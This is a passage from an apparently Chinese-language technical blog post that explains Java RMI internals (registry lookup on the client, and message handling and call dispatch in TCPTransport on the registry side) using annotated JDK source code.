class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(String host, <span class="type">int</span> port, RMIClientSocketFactory csf)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    Registry registry;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 端口归一化：&lt;=0 则采用默认端口 1099</span></span><br><span class="line">    <span class="keyword">if</span> (port &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        port = Registry.REGISTRY_PORT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 主机归一化：null/空串 → 解析成本机地址失败时，退回空串（等效于 localhost）</span></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            host = java.net.InetAddress.getLocalHost().getHostAddress();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            host = <span class="string">&quot;&quot;</span>; <span class="comment">// RMI 传输层会将空主机视作本地</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 3) 构造“活动引用（LiveRef）”</span></span><br><span class="line"><span class="comment">     *    - ObjID(REGISTRY_ID)：注册中心使用固定对象 ID，便于协议层定位</span></span><br><span class="line"><span class="comment">     *    - TCPEndpoint(host, port, csf, null)：目标端点（含可选的客户端 Socket 工厂）</span></span><br><span class="line"><span class="comment">     *    - false：此处创建的是“客户端侧引用”，非本地对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port, csf, <span class="literal">null</span>),</span><br><span class="line">            <span class="literal">false</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 4) 封装客户端远程引用（RemoteRef）</span></span><br><span class="line"><span class="comment">     *    - 无 csf：使用 UnicastRef（老款客户端引用）</span></span><br><span class="line"><span class="comment">     *    - 有 csf：使用 UnicastRef2（携带客户端工厂信息的引用）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span> (csf == <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(liveRef) : <span class="keyword">new</span> <span class="title class_">UnicastRef2</span>(liveRef);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 5) 返回 Registry 的代理</span></span><br><span class="line"><span class="comment">     *    Util.createProxy(...) 会按规则选择：</span></span><br><span class="line"><span class="comment">     *      - 若未忽略存根且存在预生成存根 *_Stub → 返回 RemoteStub（如 RegistryImpl_Stub）</span></span><br><span class="line"><span class="comment">     *      - 否则 → 返回 JDK 动态代理（Proxy + RemoteObjectInvocationHandler）</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  对于 RegistryImpl，JDK 自带 sun.rmi.registry.RegistryImpl_Stub，</span></span><br><span class="line"><span class="comment">     *  因此通常走“预生成存根”路径。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> (Registry) Util.createProxy(RegistryImpl.class, ref, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中核心过程为：</p>
<ol>
<li>通过传入的 <code>host</code> 和 <code>port</code> 创建一个 <code>LiveRef</code> 用于网络请求（注意这里传入的 <code>ObjID</code> 也是 0），并通过 <code>UnicastRef</code> 进行封装。</li>
<li>然后和注册中心的逻辑相同，尝试创建代理，这里同样获取了一个 <code>RegistryImpl_Stub</code> 对象。</li>
</ol>
<p>接着在客户端，我们通过 <code>lookup</code> 与注册中心通信，查找远程对象获取存根。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><code>RegistryImpl_Stub#lookup</code> 函数代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 客户端存根方法：调用远端注册中心的 &#123;<span class="doctag">@code</span> Registry.lookup(String)&#125; 并返回匹配名称的远程对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;实现细节：</span></span><br><span class="line"><span class="comment"> * &lt;ol&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;创建一次远程调用（&#123;<span class="doctag">@code</span> ref.newCall(...)&#125;），并将参数按 RMI 协议编组到输出流；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;通过 &#123;<span class="doctag">@code</span> ref.invoke(call)&#125; 发送请求；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;从输入流反序列化返回值（通常是该服务的 stub）；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;调用 &#123;<span class="doctag">@code</span> ref.done(call)&#125; 完成收尾（释放/归还连接）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;方法选择（协议）&lt;/b&gt;：由生成代码中的 &#123;<span class="doctag">@code</span> operations&#125; 表序号（此处为 2，opnum）</span></span><br><span class="line"><span class="comment"> * 与 &#123;<span class="doctag">@code</span> interfaceHash&#125; 共同标识远程方法。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $param_String_1 要查找的绑定名称（服务名）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 绑定到该名称的远程对象引用（通常为其存根）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> java.rmi.AccessException    访问被拒（例如远程策略限制）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> java.rmi.NotBoundException  名称未在注册中心绑定</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> java.rmi.RemoteException    远程通信/编组解组失败等通用远程错误</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@implNote</span> 本方法签名中的参数名由生成/反编译工具自动命名（如 &#123;<span class="doctag">@code</span> $param_String_1&#125;），</span></span><br><span class="line"><span class="comment"> *           仅用于展示；协议匹配只依赖参数类型与顺序，而非参数名。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> java.rmi.Remote <span class="title function_">lookup</span><span class="params">(java.lang.String $param_String_1)</span></span><br><span class="line">        <span class="keyword">throws</span> java.rmi.AccessException, java.rmi.NotBoundException, java.rmi.RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) 创建远程调用上下文（opnum=2 对应 lookup）</span></span><br><span class="line">        <span class="type">StreamRemoteCall</span> <span class="variable">call</span> <span class="operator">=</span></span><br><span class="line">            (StreamRemoteCall) ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, interfaceHash);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 2) 编组参数：写入要查找的名称</span></span><br><span class="line">            java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">            out.writeObject($param_String_1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 发送请求</span></span><br><span class="line">        ref.invoke(call);</span><br><span class="line"></span><br><span class="line">        java.rmi.Remote $result;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 4) 解组返回值：读取远端返回的远程对象引用（stub）</span></span><br><span class="line">            java.io.<span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line">            $result = (java.rmi.Remote) in.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException | java.io.IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// 生成的 stub 通常会将这些异常映射/封装；此处保留为简化示例</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;error unmarshalling return&quot;</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 5) 收尾（释放/归还连接）</span></span><br><span class="line">            ref.done(call);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.lang.RuntimeException e) &#123;</span><br><span class="line">        <span class="comment">// 生成的 stub 还会有更细的异常映射，这里按原样上抛</span></span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>与前面 <code>RegistryImpl_Stub#bind</code> 类似：</p>
<ol>
<li><code>RegistryImpl_Stub#lookup</code> 同样会调用 <code>newCall</code> 建立与远程注册中心的连接。</li>
<li>然后再通过序列化将要查找的名称写入输出流。</li>
<li>之后调用调用 <code>UnicastRef</code> 的 <code>invoke</code> 方法将序列化的名称传给远程的注册中心。</li>
<li>最后获取输入流，将返回值进行反序列化，得到远程对象的动态代理 Stub。</li>
</ol>
<p>最后总结一下，就是：</p>
<ul>
<li><code>LocateRegistry.getRegistry</code> 用于获取注册中心的 Stub，即 <code>RegistryImpl_Stub</code>，过程和注册中心的创建一样，都是调用 <code>Util#createProxy</code>。</li>
<li>注册中心实际上相当于一个客户端知道其端口号的远程对象。</li>
<li><code>RegistryImpl_Stub#lookup</code> 首先建立与注册中心的连接，服务名称序列化后写入输出流，释放输出流，等待远程返回，获取输入流进行反序列化，得到远程对象的动态代理Stub。</li>
</ul>
<h4 id="注册中心部分"><a href="#注册中心部分" class="headerlink" title="注册中心部分"></a>注册中心部分</h4><p>注册中心由 <code>sun.rmi.transport.tcp.TCPTransport#handleMessages</code> 来处理请求。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理来自指定连接（JRMP 传输层）的入站消息：逐条读取“传输操作码”，</span></span><br><span class="line"><span class="comment"> * 并按协议对调用、心跳、DGC 确认等进行相应处理。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;工作流程&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * &lt;ol&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;从 &#123;<span class="doctag">@code</span> conn.getInputStream()&#125; 读 1 个字节作为“操作码”。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;根据操作码分支：</span></span><br><span class="line"><span class="comment"> *     &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *       &lt;li&gt;&#123;<span class="doctag">@code</span> TransportConstants.Call&#125;：处理一次 RMI 远程调用。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *       &lt;li&gt;&#123;<span class="doctag">@code</span> TransportConstants.Ping&#125;：返回 &#123;<span class="doctag">@code</span> PingAck&#125; 作为保活心跳应答。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *       &lt;li&gt;&#123;<span class="doctag">@code</span> TransportConstants.DGCAck&#125;：接收 DGC 确认（租约/引用追踪相关）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *     &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若 &#123;<span class="doctag">@code</span> persistent&#125; 为 &#123;<span class="doctag">@code</span> true&#125;，在同一连接上继续循环处理后续消息；</span></span><br><span class="line"><span class="comment"> *       否则处理完一条后返回。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;异常与资源&lt;/b&gt;：在处理过程中发生 &#123;<span class="doctag">@link</span> java.io.IOException&#125;（含协议错误、</span></span><br><span class="line"><span class="comment"> * 连接断开、反序列化失败等）会终止循环并关闭底层套接字（见 catch 分支中的清理逻辑）。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> conn       已建立的传输连接（由传输层提供/复用）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> persistent 是否保持长连接（true=同一连接可承载多次请求）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">handleMessages</span><span class="params">(Connection conn, <span class="type">boolean</span> persistent)</span> &#123;</span><br><span class="line">    <span class="comment">// 仅用于日志/诊断：当前端点的服务端口</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> getEndpoint().getPort();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 用于逐字节读取“传输操作码”（不是 Java 对象反序列化）</span></span><br><span class="line">        <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(conn.getInputStream());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// 读取 1 字节操作码</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">op</span> <span class="operator">=</span> in.read();</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">                <span class="keyword">case</span> TransportConstants.Call: &#123;</span><br><span class="line">                    <span class="comment">// 收到一次远程调用请求：构造调用体并交给分发器处理</span></span><br><span class="line">                    <span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// serviceCall 内部会：定位 ObjID → 查 Target → 反序列化参数 → 反射调用 → 回写结果/异常</span></span><br><span class="line">                    <span class="comment">// 返回 false 通常表示“不要再复用该连接”（例如调用方要求关闭或发生致命错误）</span></span><br><span class="line">                    <span class="keyword">if</span> (!serviceCall(call)) &#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TransportConstants.Ping: &#123;</span><br><span class="line">                    <span class="comment">// 心跳请求：立即回写 PingAck，表示连接有效可复用</span></span><br><span class="line">                    <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(conn.getOutputStream());</span><br><span class="line">                    out.writeByte(TransportConstants.PingAck);</span><br><span class="line">                    <span class="comment">// 告知连接实现：本次写出完成，可冲刷/归还底层输出流</span></span><br><span class="line">                    conn.releaseOutputStream();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TransportConstants.DGCAck: &#123;</span><br><span class="line">                    <span class="comment">// DGC（分布式 GC）确认：读取一个 UID 并通知 DGC 处理器</span></span><br><span class="line">                    DGCAckHandler.received(UID.read(in));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="comment">// 未知/不支持的操作码：协议错误</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;unknown transport op &quot;</span> + op);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (persistent); <span class="comment">// 持久连接：在同一 TCP 连接上继续处理下一条消息</span></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先 <code>handleMessages</code> 会根据数据流的第一个操作数数值决定如何处理数据，这里主要是 <code>Call</code> 操作。对于 <code>Call</code> 操作，这里会创建一个 <code>StreamRemoteCall</code>（和客户端一样），然后调用 <code>serviceCall</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TransportConstants.Call:</span><br><span class="line">    <span class="comment">// 处理传入的 RMI 调用</span></span><br><span class="line">    <span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn);</span><br><span class="line">    <span class="keyword">if</span> (serviceCall(call) == <span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>serviceCall</code> 函数代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理一次入站的远程调用（RMI 调用会话）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;职责&lt;/b&gt;：从 &#123;<span class="doctag">@code</span> call&#125; 的输入流读取目标对象标识（&#123;<span class="doctag">@link</span> ObjID&#125;），</span></span><br><span class="line"><span class="comment"> * 在对象表中定位目标（&#123;<span class="doctag">@link</span> Target&#125;），然后在目标的安全/类加载上下文中</span></span><br><span class="line"><span class="comment"> * 调用其分发器（&#123;<span class="doctag">@link</span> Dispatcher#dispatch&#125;）完成参数解组、方法调用与结果回写。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;连接复用语义&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * 若返回 &#123;<span class="doctag">@code</span> true&#125;，表示调用已被正确处理，传输层可复用该连接；</span></span><br><span class="line"><span class="comment"> * 若返回 &#123;<span class="doctag">@code</span> false&#125;，表示发生协议级错误，传输层应销毁该连接。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;安全与上下文&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * 调用在目标的 &#123;<span class="doctag">@link</span> AccessControlContext&#125; 下执行，且临时设置线程上下文类加载器为</span></span><br><span class="line"><span class="comment"> * 目标的 &#123;<span class="doctag">@code</span> ContextClassLoader&#125;。在执行前调用 &#123;<span class="doctag">@code</span> checkAcceptPermission(acc)&#125;</span></span><br><span class="line"><span class="comment"> * 进行接入权限检查。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> call 表示这次入站调用的会话对象（已定位到消息起始处）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 是否允许传输层复用连接（&#123;<span class="doctag">@code</span> true&#125; 可复用，&#123;<span class="doctag">@code</span> false&#125; 应销毁）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">serviceCall</span><span class="params">(<span class="keyword">final</span> RemoteCall call)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">/* 1) 读取目标对象 ID（ObjID） */</span></span><br><span class="line">        <span class="keyword">final</span> Remote impl;</span><br><span class="line">        ObjID id;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            id = ObjID.read(call.getInputStream());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            <span class="comment">// 无法从输入流解出 ObjID → 编组错误</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;unable to read objID&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 2) 在对象表中定位 Target */</span></span><br><span class="line">        <span class="comment">// DGC 的特殊目标用 null 作为 transport 键的一部分</span></span><br><span class="line">        <span class="type">Transport</span> <span class="variable">transport</span> <span class="operator">=</span> id.equals(dgcID) ? <span class="literal">null</span> : <span class="built_in">this</span>;</span><br><span class="line">        <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span> ObjectTable.getTarget(<span class="keyword">new</span> <span class="title class_">ObjectEndpoint</span>(id, transport));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (target == <span class="literal">null</span> || (impl = target.getImpl()) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 未导出/已取消导出/已被回收</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchObjectException</span>(<span class="string">&quot;no such object in table&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Dispatcher</span> <span class="variable">disp</span> <span class="operator">=</span> target.getDispatcher();</span><br><span class="line">        target.incrementCallCount(); <span class="comment">// 统计当前活跃调用，配合卸载/生命周期控制</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/* 3) 在目标的安全/加载上下文里分发调用 */</span></span><br><span class="line">            transportLog.log(Log.VERBOSE, <span class="string">&quot;call dispatcher&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> <span class="type">AccessControlContext</span> <span class="variable">acc</span> <span class="operator">=</span> target.getAccessControlContext();</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">ccl</span> <span class="operator">=</span> target.getContextClassLoader();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 保存并临时切换线程上下文类加载器（影响反序列化与反射解析）</span></span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">savedCcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                setContextClassLoader(ccl);</span><br><span class="line">                currentTransport.set(<span class="built_in">this</span>); <span class="comment">// 线程局部，供下游获取当前传输</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 在目标的 ACC 下执行：先做接入权限检查，再分发调用</span></span><br><span class="line">                java.security.AccessController.doPrivileged(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">                        <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                            checkAcceptPermission(acc);</span><br><span class="line">                            disp.dispatch(impl, call); <span class="comment">// 解组参数→调用方法→回写结果/异常</span></span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;, acc);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">                